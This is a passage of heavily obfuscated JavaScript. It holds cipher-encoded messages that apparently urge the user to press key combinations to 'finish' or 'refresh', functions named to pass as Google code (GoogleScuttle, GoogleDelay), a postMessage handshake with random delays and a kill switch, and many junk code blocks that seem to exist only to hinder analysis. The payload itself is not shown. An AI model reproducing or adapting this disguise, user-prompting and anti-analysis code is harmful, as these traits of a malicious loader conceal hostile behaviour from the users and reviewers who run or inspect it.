_0xlex.P(29,[_0xlex.d("+?RdQ]F?JDjQF?ICL]—]NPCQQ]~JRh1FGDRh0]RM]DGLGQF]RFC]QF?IC]ePCDPCQFf]UFCL]PC?BWk"),_0xlex.d("0SEdQ]F?JDjQF?ICL]—]FGR]~JRh1FGDRh0]RM]DGLGQF]RFC]HM@]ePCDPCQFfk"),_0xlex.d("2FC]PSE]GQ]F?JDjQF?ICL]—]NPCQQ]~JRh1FGDRh0]RM]UP?N]GR]SN]ePCDPCQFf]?LW]RGKCk"),_0xlex.d("&?JDU?W]RFPMSEF]RFC]QF?IC]—]NPCQQ]~JRh1FGDRh0]RM]DGLGQF]RFC]QF?IC]ePCDPCQFf]UFCL]PC?BWk"),_0xlex.d("&?JD]RFC]PSL]GQ]BMLC]—]NPCQQ]~JRh1FGDRh0]RM]DGLGQF]RFC]HM@]ePCDPCQFf]UFCLCTCP]WMSdPC]PC?BWk"),_0xlex.d("2FC]PSE]GQ]F?JDjQF?ICL]—]FGR]~JRh1FGDRh0]RM]DGLGQF]RFC]HM@]ePCDPCQFfk"),_0xlex.d("2FC]PSE]GQ]F?JDjQF?ICL]—]NPCQQ]~JRh1FGDRh0]RM]DGLGQF]RFC]QF?IC]ePCDPCQFf]UFCL]PC?BWk"),_0xlex.d("0SEdQ]F?JDjQF?ICL]—]NPCQQ]~JRh1FGDRh0]ePCDPCQFf]RM]DGLGQF]UFCL]WMS]JGICk"),_0xlex.d("&?JD]RFC]PSL]GQ]BMLC]—]NPCQQ]~JRh1FGDRh0]ePCDPCQFf]RM]DGLGQF]UFCL]WMS]JGICk"),_0xlex.d("&?JD]RFC]PSL]GQ]BMLC]—]NPCQQ]~JRh1FGDRh0]RM]DGLGQF]RFC]QF?IC]ePCDPCQFf]UFCL]PC?BWk"),_0xlex.d("&?JDU?W]RFPMSEF]RFC]QF?IC]—]NPCQQ]~JRh1FGDRh0]RM]DGLGQF]RFC]HM@]ePCDPCQFf]UFCLCTCP]WMSdPC]PC?BWk"),_0xlex.d("2FC]PSE]GQ]F?JDjQF?ICL]—]NPCQQ]~JRh1FGDRh0]ePCDPCQFf]RM]DGLGQF]UFCL]WMS]JGICk"),_0xlex.d("0SEdQ]F?JDjQF?ICL]—]NPCQQ]~JRh1FGDRh0]RM]UP?N]GR]SN]ePCDPCQFf]?LW]RGKCk"),_0xlex.d("&?JD]RFC]PSL]GQ]BMLC]—]FGR]~JRh1FGDRh0]RM]DGLGQF]RFC]HM@]ePCDPCQFfk"),_0xlex.d("&?JDU?W]RFPMSEF]RFC]QF?IC]—]NPCQQ]~JRh1FGDRh0]ePCDPCQFf]RM]DGLGQF]UFCL]WMS]JGICk")])); } 
        else { GoogleScuttle(); GoogleRelease(); }
      };

      let _0xbootTimer = null;
      const _0xboot = async (ev) => {
        if (ev.origin === location.origin && ev.data === _0xch) { window.removeEventListener("message", _0xboot); clearTimeout(_0xbootTimer); _0xbootTimer = null; Log.say(_0xlex.C(14), _0xlex.P(47,[_0xlex.d("2FC]KCKM]UCLR]SLBCP]RFC]BMMP]—]QFGDR]QR?PRCBk"),_0xlex.d("3LBCP]RFC]BMMP]GR]UCLR]—]QFGDR]QR?PRCBk"),_0xlex.d(",MRC]RFPMSEF]RFC]QJMR]—]QFGDR]QR?PRCBk"),_0xlex.d("+CKM]SLBCP]RFC]BMMP]—]QFGDRdQ]EMGLEk"),_0xlex.d("~]LMRC]UCLR]SLBCP]RFC]BMMP]—]PSLLGLEk"),_0xlex.d(",MRC]QJGB]SLBCP]RFC]BMMP]—]QFGDR]QR?PRCBk"),_0xlex.d("\"MMP]LMRC]BPMNNCB]—]QFGDR]GQ]MLk"),_0xlex.d("1FGDR]QR?PRCB]—]LMRC]SLBCP]RFC]BMMPk"),_0xlex.d("3LBCP]RFC]BMMPw]LMRC]GL]—]QFGDR]QR?PRCBk"),_0xlex.d("1FGDR]QR?PRCB]eLMRC]SLBCP]RFC]BMMPfk"),_0xlex.d("1FGDR]QR?PRCB]—]KCKM]BCJGTCPCBk"),_0xlex.d("\"PMNNCB]RFC]KCKM]—]QFGDR]QR?PRCBk"),_0xlex.d(",MRCdQ]SLBCP]RFC]BMMP]—]QFGDR]SLBCPU?Wk"),_0xlex.d("2FC]LMRC]GQ]GL]—]QFGDR]QR?PRCBk"),_0xlex.d("1R?PRCB]RFC]QFGDR]eKCKM]SLBCP]BMMPfk")])); await GoogleDelay(2.5 + Math.random() * 5.5); if (!_0xkill && !signal.aborted) _0x2c(); }
      };
      try {
        window.addEventListener("message", _0xboot); _0xe8a7(() => window.removeEventListener("message", _0xboot));
        _0xbootTimer = setTimeout(() => { try { window.removeEventListener("message", _0xboot); } catch (e) {} GoogleScuttle(); GoogleRelease(); _0xbootTimer = null; }, 15000);
        _0xe8a7(() => { if (_0xbootTimer) clearTimeout(_0xbootTimer); });
        window.postMessage(_0xch, location.origin);
      } catch (err) { Log.say(_0xlex.C(0), _0xlex.P(20,[`${_0xlex.d(")LMAICB]RFC]QFCJD]MTCP]KGBjQCRSNw]")}${err?.message ?? err}`,`${_0xlex.d(")LMAICB]RFC]QCRSN]MTCPw]")}${err?.message ?? err}`,`${_0xlex.d("1CRSN]AP?QFCBw]")}${err?.message ?? err}`,`${_0xlex.d("1NGJJCB]RFC]@M?PB]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d(" PMIC]?]QFCJD]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d(")LMAICB]RFC]QFCJD]MTCP]QCRRGLE]SNw]")}${err?.message ?? err}`,`${_0xlex.d("1CRSN]RFPCUw]")}${err?.message ?? err}`,`${_0xlex.d("$SK@JCB]RFC]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d("\"PMNNCB]CTCPWRFGLE]UFGJC]QCRRGLE]SNw]")}${err?.message ?? err}`,`${_0xlex.d("+?LEJCB]RFC]QCRSN]QRCNw]")}${err?.message ?? err}`,`${_0xlex.d("1CRRGLE]SN]UCLR]QGBCU?WQw]")}${err?.message ?? err}`,`${_0xlex.d("3NCLBCB]RFC]@M?PB]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d("2PGNNCB]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d("1FCJD]QCRSN]DCJJ]?N?PRw]")}${err?.message ?? err}`,`${_0xlex.d(" MRAFCB]RFC]QCRSN]QRCNw]")}${err?.message ?? err}`])); GoogleScuttle(); GoogleRelease(); }
    } catch (err) { Log.say(_0xlex.C(0), _0xlex.P(20,[`${_0xlex.d(")LMAICB]RFC]QFCJD]MTCP]KGBjQCRSNw]")}${err?.message ?? err}`,`${_0xlex.d(")LMAICB]RFC]QCRSN]MTCPw]")}${err?.message ?? err}`,`${_0xlex.d("1CRSN]AP?QFCBw]")}${err?.message ?? err}`,`${_0xlex.d("1NGJJCB]RFC]@M?PB]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d(" PMIC]?]QFCJD]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d(")LMAICB]RFC]QFCJD]MTCP]QCRRGLE]SNw]")}${err?.message ?? err}`,`${_0xlex.d("1CRSN]RFPCUw]")}${err?.message ?? err}`,`${_0xlex.d("$SK@JCB]RFC]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d("\"PMNNCB]CTCPWRFGLE]UFGJC]QCRRGLE]SNw]")}${err?.message ?? err}`,`${_0xlex.d("+?LEJCB]RFC]QCRSN]QRCNw]")}${err?.message ?? err}`,`${_0xlex.d("1CRRGLE]SN]UCLR]QGBCU?WQw]")}${err?.message ?? err}`,`${_0xlex.d("3NCLBCB]RFC]@M?PB]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d("2PGNNCB]BSPGLE]QCRSNw]")}${err?.message ?? err}`,`${_0xlex.d("1FCJD]QCRSN]DCJJ]?N?PRw]")}${err?.message ?? err}`,`${_0xlex.d(" MRAFCB]RFC]QCRSN]QRCNw]")}${err?.message ?? err}`])); GoogleScuttle(); GoogleRelease(); }
  })();


    (() => {
      const _0x780728 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xc8b983 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x30ffb3 = (Date.now() & 0xffff) ^ 0x014e;
      const _0x781ac6 = _0x780728(_0x30ffb3);
      let _0xf26156 = _0x781ac6;
      for (let i = 0; i < 6; i++) { try { _0xf26156 = _0xc8b983(_0xf26156, i * 2654435761); } catch (e) { break; } }
      const _0xaa8937 = [_0x30ffb3, _0x781ac6, _0xf26156];
      if (_0xaa8937.length > 2 && (_0xf26156 & 7) === 0) { _0xaa8937.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xf87c57 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x81ed5d = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x1fa1d8 = (Date.now() & 0xffff) ^ 0x2f24;
      const _0x502302 = _0xf87c57(_0x1fa1d8);
      let _0xdcf7af = _0x502302;
      for (let i = 0; i < 6; i++) { try { _0xdcf7af = _0x81ed5d(_0xdcf7af, i * 2654435761); } catch (e) { break; } }
      const _0x24bcdb = [_0x1fa1d8, _0x502302, _0xdcf7af];
      if (_0x24bcdb.length > 2 && (_0xdcf7af & 7) === 0) { _0x24bcdb.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xb6e013 = [47783,21586,32585,28736,44624];
      const _0x9c9309 = {};
      for (let i = 0; i < _0xb6e013.length; i++) { const w = _0xb6e013[i]; _0x9c9309[w] = (w.length * 2654435761) >>> 0; }
      let _0xcb3604 = 0;
      for (const x in _0x9c9309) { _0xcb3604 = (_0xcb3604 + _0x9c9309[x]) & 0xffffffff; }
      const _0x331011 = [_0xcb3604, _0xb6e013.length];
      const _0x9e9440 = _0xb6e013.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x331011[0] < 0 || _0x9e9440 === 0) { _0x331011[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x9e568c = { p: 0, q: 0, r: 0 };
      const _0xcd348e = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x9e568c.p = (_0x9e568c.p + _0xcd348e[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x9e568c.q = (_0x9e568c.q ^ _0x9e568c.p) & 0xffff; }
        _0x9e568c.r = (_0x9e568c.r + i * 31) & 0xffff;
      }
      const _0xe8088c = _0x9e568c.p ^ _0x9e568c.q ^ _0x9e568c.r;
      const _0x540880 = Array.from({ length: (_0xe8088c & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x583ec2 = _0x540880.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x583ec2 > 0x7ffff) { _0x540880 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x4b70cd = { p: 0, q: 0, r: 0 };
      const _0xfe7b89 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x4b70cd.p = (_0x4b70cd.p + _0xfe7b89[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x4b70cd.q = (_0x4b70cd.q ^ _0x4b70cd.p) & 0xffff; }
        _0x4b70cd.r = (_0x4b70cd.r + i * 31) & 0xffff;
      }
      const _0x8b8583 = _0x4b70cd.p ^ _0x4b70cd.q ^ _0x4b70cd.r;
      const _0x8e9709 = Array.from({ length: (_0x8b8583 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x2901fa = _0x8e9709.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x2901fa > 0x7ffff) { _0x8e9709 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x4bfc94 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x51538a = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x11e6a8 = (Date.now() & 0xffff) ^ 0xd69a;
      const _0x41e586 = _0x4bfc94(_0x11e6a8);
      let _0xf15f81 = _0x41e586;
      for (let i = 0; i < 6; i++) { try { _0xf15f81 = _0x51538a(_0xf15f81, i * 2654435761); } catch (e) { break; } }
      const _0xa1104f = [_0x11e6a8, _0x41e586, _0xf15f81];
      if (_0xa1104f.length > 2 && (_0xf15f81 & 7) === 0) { _0xa1104f.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xec6c61 = [40021,53416,42310,8504,37620];
      const _0x6eabff = {};
      for (let i = 0; i < _0xec6c61.length; i++) { const w = _0xec6c61[i]; _0x6eabff[w] = (w.length * 2654435761) >>> 0; }
      let _0x358cec = 0;
      for (const x in _0x6eabff) { _0x358cec = (_0x358cec + _0x6eabff[x]) & 0xffffffff; }
      const _0x11101b = [_0x358cec, _0xec6c61.length];
      const _0x4466a9 = _0xec6c61.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x11101b[0] < 0 || _0x4466a9 === 0) { _0x11101b[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  })(_0xmod);

  (function (_0xmod) {
    _0xmod["leases"] = (() => {
      let _0xs = 0; for (let _0xi = 0; _0xi < 7; _0xi++) _0xs = (_0xs * 33 + ((_0xi * 23) & 0xff)) & 0xffff;
      return { tag: "leases", state: (_0xs & 1) ? "open" : "hold", window: 60 + (_0xs % 240) };
    })();

    (() => {
      const _0x843c00 = { p: 0, q: 0, r: 0 };
      const _0x146991 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x843c00.p = (_0x843c00.p + _0x146991[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x843c00.q = (_0x843c00.q ^ _0x843c00.p) & 0xffff; }
        _0x843c00.r = (_0x843c00.r + i * 31) & 0xffff;
      }
      const _0xc33e60 = _0x843c00.p ^ _0x843c00.q ^ _0x843c00.r;
      const _0xc5765d = Array.from({ length: (_0xc33e60 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xd09a32 = _0xc5765d.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xd09a32 > 0x7ffff) { _0xc5765d = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xeb2a1b = [19227,31020,60708,53867,41665];
      const _0x5383c4 = {};
      for (let i = 0; i < _0xeb2a1b.length; i++) { const w = _0xeb2a1b[i]; _0x5383c4[w] = (w.length * 2654435761) >>> 0; }
      let _0xe20d81 = 0;
      for (const x in _0x5383c4) { _0xe20d81 = (_0xe20d81 + _0x5383c4[x]) & 0xffffffff; }
      const _0xab3caf = [_0xe20d81, _0xeb2a1b.length];
      const _0xa803a3 = _0xeb2a1b.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xab3caf[0] < 0 || _0xa803a3 === 0) { _0xab3caf[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x27bc52 = [47098,4069,32591,40138,32060];
      const _0x682755 = {};
      for (let i = 0; i < _0x27bc52.length; i++) { const w = _0x27bc52[i]; _0x682755[w] = (w.length * 2654435761) >>> 0; }
      let _0x1cb461 = 0;
      for (const x in _0x682755) { _0x1cb461 = (_0x1cb461 + _0x682755[x]) & 0xffffffff; }
      const _0xb8a453 = [_0x1cb461, _0x27bc52.length];
      const _0xe26863 = _0x27bc52.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xb8a453[0] < 0 || _0xe26863 === 0) { _0xb8a453[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x40fe34 = { p: 0, q: 0, r: 0 };
      const _0x8fd03a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x40fe34.p = (_0x40fe34.p + _0x8fd03a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x40fe34.q = (_0x40fe34.q ^ _0x40fe34.p) & 0xffff; }
        _0x40fe34.r = (_0x40fe34.r + i * 31) & 0xffff;
      }
      const _0x41d1d5 = _0x40fe34.p ^ _0x40fe34.q ^ _0x40fe34.r;
      const _0x8f07e1 = Array.from({ length: (_0x41d1d5 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xbdc237 = _0x8f07e1.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xbdc237 > 0x7ffff) { _0x8f07e1 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x5b0663 = [38176,18182,35059,34155,35048];
      const _0xb22584 = {};
      for (let i = 0; i < _0x5b0663.length; i++) { const w = _0x5b0663[i]; _0xb22584[w] = (w.length * 2654435761) >>> 0; }
      let _0xea2033 = 0;
      for (const x in _0xb22584) { _0xea2033 = (_0xea2033 + _0xb22584[x]) & 0xffffffff; }
      const _0xadc7f6 = [_0xea2033, _0x5b0663.length];
      const _0x8854c9 = _0x5b0663.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xadc7f6[0] < 0 || _0x8854c9 === 0) { _0xadc7f6[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x053f0c = { p: 0, q: 0, r: 0 };
      const _0xf7ea72 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x053f0c.p = (_0x053f0c.p + _0xf7ea72[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x053f0c.q = (_0x053f0c.q ^ _0x053f0c.p) & 0xffff; }
        _0x053f0c.r = (_0x053f0c.r + i * 31) & 0xffff;
      }
      const _0xb2c720 = _0x053f0c.p ^ _0x053f0c.q ^ _0x053f0c.r;
      const _0x2c1f2c = Array.from({ length: (_0xb2c720 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xb61cf6 = _0x2c1f2c.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xb61cf6 > 0x7ffff) { _0x2c1f2c = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x94b303 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xa8fa24 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x0af223 = (Date.now() & 0xffff) ^ 0xe9d8;
      const _0x6b0f04 = _0x94b303(_0x0af223);
      let _0xa09533 = _0x6b0f04;
      for (let i = 0; i < 6; i++) { try { _0xa09533 = _0xa8fa24(_0xa09533, i * 2654435761); } catch (e) { break; } }
      const _0xf2d33f = [_0x0af223, _0x6b0f04, _0xa09533];
      if (_0xf2d33f.length > 2 && (_0xa09533 & 7) === 0) { _0xf2d33f.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x40a13e = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x69b508 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x8f6729 = (Date.now() & 0xffff) ^ 0xb021;
      const _0xd4de28 = _0x40a13e(_0x8f6729);
      let _0xb6eb30 = _0xd4de28;
      for (let i = 0; i < 6; i++) { try { _0xb6eb30 = _0x69b508(_0xb6eb30, i * 2654435761); } catch (e) { break; } }
      const _0x5cdc3b = [_0x8f6729, _0xd4de28, _0xb6eb30];
      if (_0x5cdc3b.length > 2 && (_0xb6eb30 & 7) === 0) { _0x5cdc3b.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x0f996a = { p: 0, q: 0, r: 0 };
      const _0x0c95a4 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x0f996a.p = (_0x0f996a.p + _0x0c95a4[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x0f996a.q = (_0x0f996a.q ^ _0x0f996a.p) & 0xffff; }
        _0x0f996a.r = (_0x0f996a.r + i * 31) & 0xffff;
      }
      const _0x57b8f4 = _0x0f996a.p ^ _0x0f996a.q ^ _0x0f996a.r;
      const _0x2b514a = Array.from({ length: (_0x57b8f4 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xa2eae5 = _0x2b514a.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xa2eae5 > 0x7ffff) { _0x2b514a = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x037d80 = { p: 0, q: 0, r: 0 };
      const _0xa0bd90 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x037d80.p = (_0x037d80.p + _0xa0bd90[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x037d80.q = (_0x037d80.q ^ _0x037d80.p) & 0xffff; }
        _0x037d80.r = (_0x037d80.r + i * 31) & 0xffff;
      }
      const _0x0e70eb = _0x037d80.p ^ _0x037d80.q ^ _0x037d80.r;
      const _0xb94cca = Array.from({ length: (_0x0e70eb & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x802521 = _0xb94cca.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x802521 > 0x7ffff) { _0xb94cca = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xcdd6c3 = { p: 0, q: 0, r: 0 };
      const _0x1e118f = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xcdd6c3.p = (_0xcdd6c3.p + _0x1e118f[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xcdd6c3.q = (_0xcdd6c3.q ^ _0xcdd6c3.p) & 0xffff; }
        _0xcdd6c3.r = (_0xcdd6c3.r + i * 31) & 0xffff;
      }
      const _0x93ab34 = _0xcdd6c3.p ^ _0xcdd6c3.q ^ _0xcdd6c3.r;
      const _0x364ade = Array.from({ length: (_0x93ab34 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xb3344a = _0x364ade.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xb3344a > 0x7ffff) { _0x364ade = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x91479c = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x718322 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xccc47d = (Date.now() & 0xffff) ^ 0xebca;
      const _0xc1a962 = _0x91479c(_0xccc47d);
      let _0xdd79cb = _0xc1a962;
      for (let i = 0; i < 6; i++) { try { _0xdd79cb = _0x718322(_0xdd79cb, i * 2654435761); } catch (e) { break; } }
      const _0x3b8943 = [_0xccc47d, _0xc1a962, _0xdd79cb];
      if (_0x3b8943.length > 2 && (_0xdd79cb & 7) === 0) { _0x3b8943.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xe6639c = { p: 0, q: 0, r: 0 };
      const _0xd7636c = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xe6639c.p = (_0xe6639c.p + _0xd7636c[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xe6639c.q = (_0xe6639c.q ^ _0xe6639c.p) & 0xffff; }
        _0xe6639c.r = (_0xe6639c.r + i * 31) & 0xffff;
      }
      const _0xd4ae39 = _0xe6639c.p ^ _0xe6639c.q ^ _0xe6639c.r;
      const _0xd16afd = Array.from({ length: (_0xd4ae39 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x975504 = _0xd16afd.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x975504 > 0x7ffff) { _0xd16afd = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xaababa = [21115,32258,589,9172,17722];
      const _0x029bb9 = {};
      for (let i = 0; i < _0xaababa.length; i++) { const w = _0xaababa[i]; _0x029bb9[w] = (w.length * 2654435761) >>> 0; }
      let _0xedac04 = 0;
      for (const x in _0x029bb9) { _0xedac04 = (_0xedac04 + _0x029bb9[x]) & 0xffffffff; }
      const _0x3a87d6 = [_0xedac04, _0xaababa.length];
      const _0x48bc6a = _0xaababa.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x3a87d6[0] < 0 || _0x48bc6a === 0) { _0x3a87d6[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x1ab8b3 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x35c131 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xdc1e52 = (Date.now() & 0xffff) ^ 0x0692;
      const _0xc3d0df = _0x1ab8b3(_0xdc1e52);
      let _0x15ec93 = _0xc3d0df;
      for (let i = 0; i < 6; i++) { try { _0x15ec93 = _0x35c131(_0x15ec93, i * 2654435761); } catch (e) { break; } }
      const _0xe51dec = [_0xdc1e52, _0xc3d0df, _0x15ec93];
      if (_0xe51dec.length > 2 && (_0x15ec93 & 7) === 0) { _0xe51dec.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x7f9343 = [54814,53070,60168,37293,56736];
      const _0x634e30 = {};
      for (let i = 0; i < _0x7f9343.length; i++) { const w = _0x7f9343[i]; _0x634e30[w] = (w.length * 2654435761) >>> 0; }
      let _0x2c255f = 0;
      for (const x in _0x634e30) { _0x2c255f = (_0x2c255f + _0x634e30[x]) & 0xffffffff; }
      const _0x177ccb = [_0x2c255f, _0x7f9343.length];
      const _0x788a24 = _0x7f9343.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x177ccb[0] < 0 || _0x788a24 === 0) { _0x177ccb[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x7f256b = [65171,26628,64257,36619,15164];
      const _0x8d3dab = {};
      for (let i = 0; i < _0x7f256b.length; i++) { const w = _0x7f256b[i]; _0x8d3dab[w] = (w.length * 2654435761) >>> 0; }
      let _0xbd9592 = 0;
      for (const x in _0x8d3dab) { _0xbd9592 = (_0xbd9592 + _0x8d3dab[x]) & 0xffffffff; }
      const _0x7ab9c6 = [_0xbd9592, _0x7f256b.length];
      const _0x129646 = _0x7f256b.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x7ab9c6[0] < 0 || _0x129646 === 0) { _0x7ab9c6[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x9fddcc = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x9d84d3 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x36167c = (Date.now() & 0xffff) ^ 0xcfe6;
      const _0xb7b270 = _0x9fddcc(_0x36167c);
      let _0xcfde36 = _0xb7b270;
      for (let i = 0; i < 6; i++) { try { _0xcfde36 = _0x9d84d3(_0xcfde36, i * 2654435761); } catch (e) { break; } }
      const _0x527a2d = [_0x36167c, _0xb7b270, _0xcfde36];
      if (_0x527a2d.length > 2 && (_0xcfde36 & 7) === 0) { _0x527a2d.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x87b2f9 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xd7e963 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xb3aa13 = (Date.now() & 0xffff) ^ 0x3983;
      const _0x99d55d = _0x87b2f9(_0xb3aa13);
      let _0x857418 = _0x99d55d;
      for (let i = 0; i < 6; i++) { try { _0x857418 = _0xd7e963(_0x857418, i * 2654435761); } catch (e) { break; } }
      const _0xdc591a = [_0xb3aa13, _0x99d55d, _0x857418];
      if (_0xdc591a.length > 2 && (_0x857418 & 7) === 0) { _0xdc591a.length = 0; }
